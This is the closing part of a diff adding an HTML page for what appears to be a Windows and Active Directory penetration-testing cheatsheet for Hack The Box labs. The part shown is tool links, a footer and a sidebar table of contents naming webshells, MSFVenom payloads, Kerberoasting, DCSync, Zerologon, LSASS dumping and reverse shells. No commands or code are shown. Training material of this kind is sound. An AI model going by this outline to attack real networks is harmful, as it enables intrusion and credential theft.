+        Certify: https://github.com/GhostPack/Certify
+        Certipy: https://github.com/ly4k/Certipy (ADCS attacks from Kali)
+      </div>
+    </div>
+    <hr class="md-hr">
+    <p class="md-p"><em>🔒 Built for HTB by 0xRoot | Windows & Active Directory Methodology</em> <em>Use responsibly on
+        authorized systems only.</em></p>
+
+  </div>
+  <script>
+    initPage({
+      title: 'Windows & Active Directory Penetration Testing Cheatsheet',
+      breadcrumb: 'cheatsheets/htb_WINDOWS_cheatsheet',
+      tags: [{ label: 'Windows', color: 'purple' }, { label: 'Active Directory', color: 'yellow' }],
+      extraSb: `
+      <div style="padding:13px 10px 6px;border-top:1px solid var(--border)">
+        <div class="sb-sec-lbl">contents</div>
+        <a href="#by-j0stif-full-methodology-recon-system-domain-admin" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>by J0stif | Full Methodology: Recon → SYSTEM / Domain Admin</a>
+<a href="#table-of-contents" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>📋 TABLE OF CONTENTS</a>
+<a href="#environment-setup" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>🛠️ Environment Setup</a>
+<a href="#phase-1-reconnaissance-port-scanning" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 1 — Reconnaissance & Port Scanning</a>
+<a href="#11-nmap" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>1.1 Nmap</a>
+<a href="#12-common-windows-ad-ports" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>1.2 Common Windows / AD Ports</a>
+<a href="#phase-2-windows-service-enumeration" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 2 — Windows Service Enumeration</a>
+<a href="#21-smb-enumeration" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.1 SMB Enumeration</a>
+<a href="#22-rpc-enumeration" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.2 RPC Enumeration</a>
+<a href="#23-rdp-port-3389" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.3 RDP (Port 3389)</a>
+<a href="#24-winrm-port-59855986" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.4 WinRM (Port 5985/5986)</a>
+<a href="#25-dns-enumeration" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.5 DNS Enumeration</a>
+<a href="#26-mssql-port-1433" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>2.6 MSSQL (Port 1433)</a>
+<a href="#phase-3-active-directory-enumeration" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 3 — Active Directory Enumeration</a>
+<a href="#31-ldap-enumeration" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.1 LDAP Enumeration</a>
+<a href="#32-bloodhound-enumeration" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.2 BloodHound Enumeration</a>
+<a href="#33-user-enumeration" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>3.3 User Enumeration</a>
+<a href="#phase-4-web-application-attacks" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 4 — Web Application Attacks</a>
+<a href="#41-iis-specific-enumeration" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>4.1 IIS-Specific Enumeration</a>
+<a href="#42-aspaspx-webshells" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>4.2 ASP/ASPX Webshells</a>
+<a href="#43-sql-injection-on-windows-mssql" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>4.3 SQL Injection on Windows / MSSQL</a>
+<a href="#phase-5-initial-access-exploitation" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 5 — Initial Access & Exploitation</a>
+<a href="#51-password-spraying" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>5.1 Password Spraying</a>
+<a href="#52-as-rep-roasting-no-pre-auth-required" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>5.2 AS-REP Roasting (No Pre-Auth Required)</a>
+<a href="#53-kerberoasting" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>5.3 Kerberoasting</a>
+<a href="#54-searchsploit-cves" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>5.4 Searchsploit & CVEs</a>
+<a href="#55-msfvenom-payloads-windows" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>5.5 MSFVenom Payloads (Windows)</a>
+<a href="#phase-6-post-exploitation-situational-awareness" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 6 — Post-Exploitation & Situational Awareness</a>
+<a href="#61-basic-windows-enumeration" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.1 Basic Windows Enumeration</a>
+<a href="#62-powershell-enumeration" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.2 PowerShell Enumeration</a>
+<a href="#63-finding-credentials" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>6.3 Finding Credentials</a>
+<a href="#phase-7-windows-privilege-escalation" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 7 — Windows Privilege Escalation</a>
+<a href="#71-automated-enumeration" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.1 Automated Enumeration</a>
+<a href="#72-token-privilege-abuse" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.2 Token & Privilege Abuse</a>
+<a href="#73-unquoted-service-paths" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.3 Unquoted Service Paths</a>
+<a href="#74-weak-service-permissions" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.4 Weak Service Permissions</a>
+<a href="#75-alwaysinstallelevated" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.5 AlwaysInstallElevated</a>
+<a href="#76-dll-hijacking" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.6 DLL Hijacking</a>
+<a href="#77-scheduled-tasks" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.7 Scheduled Tasks</a>
+<a href="#78-stored-credentials" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.8 Stored Credentials</a>
+<a href="#79-registry-autoruns" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.9 Registry Autoruns</a>
+<a href="#710-uac-bypass" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>7.10 UAC Bypass</a>
+<a href="#phase-8-active-directory-attacks" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 8 — Active Directory Attacks</a>
+<a href="#81-ntlm-relay-attacks" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>8.1 NTLM Relay Attacks</a>
+<a href="#82-kerberos-delegation-attacks" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>8.2 Kerberos Delegation Attacks</a>
+<a href="#83-acl-ace-abuse" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>8.3 ACL / ACE Abuse</a>
+<a href="#84-pass-the-hash-pth" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>8.4 Pass-the-Hash (PtH)</a>
+<a href="#85-pass-the-ticket-ptt" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>8.5 Pass-the-Ticket (PtT)</a>
+<a href="#86-overpass-the-hash-pass-the-key" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>8.6 Overpass-the-Hash / Pass-the-Key</a>
+<a href="#87-golden-ticket" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>8.7 Golden Ticket</a>
+<a href="#88-silver-ticket" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>8.8 Silver Ticket</a>
+<a href="#phase-9-lateral-movement" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 9 — Lateral Movement</a>
+<a href="#91-psexec-impacket-execution" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>9.1 PsExec / Impacket Execution</a>
+<a href="#92-sysinternals-psexec" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>9.2 Sysinternals PsExec</a>
+<a href="#93-wmi-lateral-movement" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>9.3 WMI Lateral Movement</a>
+<a href="#94-pass-the-hash-with-mimikatz" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>9.4 Pass-the-Hash with Mimikatz</a>
+<a href="#phase-10-domain-compromise-dcsync" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 10 — Domain Compromise & DCSync</a>
+<a href="#101-dcsync-attack" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>10.1 DCSync Attack</a>
+<a href="#102-ntdsdit-extraction" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>10.2 NTDS.dit Extraction</a>
+<a href="#103-zerologon-cve-2020-1472" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>10.3 Zerologon (CVE-2020-1472)</a>
+<a href="#phase-11-credential-dumping-loot" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 11 — Credential Dumping & Loot</a>
+<a href="#111-lsass-dump" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>11.1 LSASS Dump</a>
+<a href="#112-sam-registry-hives" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>11.2 SAM / Registry Hives</a>
+<a href="#113-mimikatz-full-reference" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>11.3 Mimikatz Full Reference</a>
+<a href="#114-hash-cracking" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>11.4 Hash Cracking</a>
+<a href="#115-flags" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>11.5 Flags</a>
+<a href="#file-transfer-techniques" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>File Transfer Techniques</a>
+<a href="#from-kali-windows" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>From Kali → Windows</a>
+<a href="#from-windows-kali" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>From Windows → Kali</a>
+<a href="#shells-listeners" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Shells & Listeners</a>
+<a href="#windows-reverse-shells" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Windows Reverse Shells</a>
+<a href="#listeners" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Listeners</a>
+<a href="#wordlists-resources" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Wordlists & Resources</a>
+<a href="#key-references-tools" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Key References & Tools</a>
+
+      </div>`,
+    });
+  </script>
+</body>
+
+</html>
